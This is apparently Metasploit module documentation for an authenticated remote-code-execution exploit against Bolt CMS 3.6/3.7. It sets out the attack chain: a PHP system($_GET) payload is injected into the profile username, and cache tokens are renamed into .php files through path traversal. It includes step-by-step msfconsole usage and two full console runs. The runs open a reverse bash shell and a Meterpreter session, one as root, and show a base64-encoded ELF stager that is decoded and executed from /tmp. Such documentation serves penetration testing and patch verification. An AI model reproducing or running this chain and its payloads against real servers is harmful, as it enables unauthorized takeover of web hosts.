## Vulnerable Application

This module exploits multiple vulnerabilities in Bolt CMS version 3.7.0 and 3.6.* in order to execute arbitrary commands as the user running Bolt.

This module first authenticates to Bolt CMS and visits the profile page to obtain a special token.
This token is then used to change the username in /bolt/profile to a PHP `system($_GET[""])` variable, using a generated random name.
If this succeeds, the target may be vulnerable.
The module then proceeds by issuing an HTTP GET request for /bolt/overview/showcases in order to obtain a CSRF token to be used later.

Next, the module obtains a list of filename tokens from `/async/browse/cache/.sessions.`
These tokens are used to create files with the blacklisted `.php` extension via HTTP POST requests to `/async/folder/rename`.
With the CSRF token obtained before, it is possible to create .php files by "renaming" these cache tokens.
While most (if not all) available tokens can be used to created .php files in the /root directory on the server,
the resulting files cannot always be used to execute commands.
The module excludes tokens with a filesize of under 2000 bytes, as they can't ever be used for this purpose. For the remaining tokens,
it seems the easiest way to identify a valid one is to use each token to create a .php file
and then check the contents of that file.
The module does exactly this, deleting any .php files that can't be used
until it finds a file for which the "displayname" value is an empty string ("").
This value indicates that the profile username matching this token is the `$_GET` variable generated earlier,
and that the file can be used to execute arbitrary commands.
If a valid .php file is created, the module executes the payload via an HTTP get request in this format:
`/files/<rogue_PHP_file>?<$_GET_variable>=<payload>`

The module requires valid credentials for a Bolt CMS user. This module has been successfully tested on Bolt CMS 3.7.0.

## Verification Steps

1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/unix/webapp/bolt_authenticated_rce`
4. Do: `set RHOSTS [IP]`
5. Do: `set USERNAME [username for the Bolt CMS account]`
6. Do: `set PASSWORD [password for the Bolt CMS account]`
7. Do: `set payload [payload]`
8. Do: `set LHOST [IP]`
9. Do: `exploit`

## Options

### FILE_TRAVERSAL_PATH

This is the traversal path to get from the `/files/` directory on the web server to the `/root` directory on the server.
It is used by the module to write rogue .php files to /root. The default value is `../../../public/files`.

### PASSWORD

The password for the Bolt CMS account to authenticate with. This option is required.

### TARGETURI

The base path to Bolt CMS. The default value is `/`.

### USERNAME

The username for the Bolt CMS account to authenticate with. This option is required.

## Scenarios

### Bolt CMS 3.7.0 running on CentOS 7

```
msf5 exploit(unix/webapp/bolt_authenticated_rce) > show options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Path from the "files" directory to the root folder
   PASSWORD             boltbolt               yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS               192.168.1.4            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                8000                   yes       The target port (TCP)
   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT              8080                   yes       The local port to listen on.
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME             bolt                   yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.10   yes       The listen address (an interface may be specified)
   LPORT  4444           yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)


msf5 exploit(unix/webapp/bolt_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.10:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "nbxnh".
[*] Found 6 potential token(s) for creating .php files.
[+] Used token a0293d73f435515024c2c5d37a to create phfsbswowfp.php.
[*] Attempting to execute the payload via "/files/phfsbswowfp.php?nbxnh=`payload`"
[+] Payload executed!
[+] Deleted file phfsbswowfp.php.
[+] Reverted user profile back to original state.
[*] Command shell session 1 opened (192.168.1.10:4444 -> 192.168.1.4:52008) at 2020-05-26 09:15:19 -0400

id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### Bolt CMS 3.7.0 running on Ubuntu 18.04

```
msf5 exploit(unix/webapp/bolt_authenticated_rce) > options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
   PASSWORD             boltbolt               yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS               172.28.128.5           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                8000                   yes       The target port (TCP)
   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT              8080                   yes       The local port to listen on.
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME             bolt                   yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.28.128.1     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)


msf5 exploit(unix/webapp/bolt_authenticated_rce) > run

[*] Started reverse TCP handler on 172.28.128.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "qjej".
[*] Found CSRF token: pAuS_pLAjcUd8wPjq7Xus72UE2N0P4YB8HularDy3A0
[*] Found 1 potential token(s) for creating .php files.
[+] Used token a5881f86a828d3810fa0fa64fb to create cojwcnuk.php.
[*] Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXKwcgAFRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g==>>'/tmp/QtQwu.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/nSljj' < '/tmp/QtQwu.b64' ; chmod +x '/tmp/nSljj' ; '/tmp/nSljj' ; rm -f '/tmp/nSljj' ; rm -f '/tmp/QtQwu.b64'"]
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3012516 bytes) to 172.28.128.5
[*] Meterpreter session 1 opened (172.28.128.1:4444 -> 172.28.128.5:41918) at 2020-06-28 22:39:20 -0500
[!] No response, may have executed a blocking payload!
[*] Command Stager progress - 100.00% done (823/823 bytes)
[+] Deleted file cojwcnuk.php.
[+] Reverted user profile back to original state.

meterpreter > getuid
Server username: no-user @ ubuntu-bionic (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > sysinfo
Computer     : 10.0.2.15
OS           : Ubuntu 18.04 (Linux 4.15.0-91-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
